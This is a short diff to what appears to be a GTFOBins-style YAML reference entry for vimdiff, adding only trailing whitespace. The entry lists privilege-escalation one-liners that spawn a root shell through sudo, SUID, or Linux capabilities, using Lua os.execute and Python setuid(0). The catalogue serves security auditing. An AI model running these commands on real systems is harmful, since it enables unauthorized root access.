@@ -118,7 +118,7 @@ functions:
       code: sudo vimdiff -c ':lua os.execute("reset; exec sh")'
   capabilities:
     - description: This requires that `vimdiff` is compiled with Python support. Prepend `:py3` for Python 3.
-      code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+      code: ./vimdiff -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")' 
   limited-suid:
     - description: This requires that `vimdiff` is compiled with Lua support.
       code: ./vimdiff -c ':lua os.execute("reset; exec sh")'
